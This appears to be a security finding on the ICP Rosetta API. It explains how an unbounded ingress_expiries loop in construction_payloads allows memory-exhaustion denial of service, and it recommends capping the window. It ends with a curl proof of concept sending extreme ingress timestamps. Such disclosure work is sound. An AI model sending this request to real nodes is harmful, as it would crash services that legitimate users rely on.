### Title
Unbounded `ingress_expiries` Loop Allows OOM DoS via Attacker-Controlled `ingress_start`/`ingress_end` — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

---

### Summary

The `construction_payloads` handler in ICP Rosetta accepts attacker-controlled `ingress_start` and `ingress_end` nanosecond timestamps with no server-side span cap. The while-loop that builds `ingress_expiries` iterates `(ingress_end − ingress_start) / interval` times with no bound check, allowing a single unauthenticated HTTP request to exhaust Rosetta process memory.

---

### Finding Description

In `construction_payloads`, the step size `interval` is computed as:

```
interval = MAX_INGRESS_TTL − PERMITTED_DRIFT − 120 s
         = 300 s − 60 s − 120 s = 120 s = 120 000 000 000 ns
``` [1](#0-0) [2](#0-1) 

The loop then runs without any cap:

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    ingress_expiries.push(ingress_expiry);
    now += interval;
}
``` [3](#0-2) 

`ingress_start` and `ingress_end` are plain `Option<u64>` fields deserialized directly from the JSON body with no validation: [4](#0-3) 

With `ingress_start = 0` and `ingress_end = u64::MAX = 18 446 744 073 709 551 615`:

```
iterations ≈ 18 446 744 073 709 551 615 / 120 000 000 000 ≈ 153 722 867 280
```

Each iteration pushes one `u64` (8 bytes) → **≈ 1.23 TB** for `ingress_expiries` alone. Additionally, `add_payloads` iterates over `ingress_expiries` for every transaction and pushes **two** `SigningPayload` structs per entry, multiplying the allocation further: [5](#0-4) 

There is no guard anywhere in the ICP Rosetta path that caps the span or the resulting vector length.

---

### Impact Explanation

A single unauthenticated POST to `/construction/payloads` with `metadata.ingress_start=0` and `metadata.ingress_end=18446744073709551615` causes the Rosetta process to attempt allocating hundreds of gigabytes to terabytes of memory, triggering an OOM kill or indefinite CPU spin before the allocator fails. This crashes or hangs the Rosetta node, denying service to all legitimate users relying on it for ICP transfers and neuron management.

---

### Likelihood Explanation

The Rosetta HTTP endpoint is publicly reachable by design. No authentication, no API key, and no rate-limiting on the metadata fields is required. The exploit is a single HTTP request reproducible by any client. The ICRC1 Rosetta sibling (`rs/rosetta-api/icrc1/src/construction_api/services.rs`) has partial validation (`ingress_start >= ingress_end` check) but still lacks an upper-bound cap on the span, confirming the pattern is a known gap. [6](#0-5) 

---

### Recommendation

Add a server-side cap on the ingress window span before entering the loop, for example:

```rust
const MAX_INGRESS_WINDOW: Duration = Duration::from_secs(24 * 3600); // 24 h
let ingress_end = ingress_end.min(ingress_start + MAX_INGRESS_WINDOW);
```

Or equivalently, cap `ingress_expiries.len()` to a fixed constant (e.g., `MAX_INGRESS_TTL / interval * 24 * 3 ≈ 2160` entries for a 24-hour window) and return an error if the requested span exceeds it.

---

### Proof of Concept

```bash
curl -s -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [{"operation_identifier":{"index":0},"type":"TRANSACTION",
      "account":{"address":"<valid-account>"},
      "amount":{"value":"-100","currency":{"symbol":"ICP","decimals":8}}}],
    "public_keys": [{"hex_bytes":"<valid-pubkey>","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
```

The Rosetta process will enter the unbounded loop and be killed by the OS OOM killer before returning a response. Confirm with `dmesg | grep -i oom` or by observing process memory growth with `watch -n0.1 'ps -o rss= -p <pid>'`.
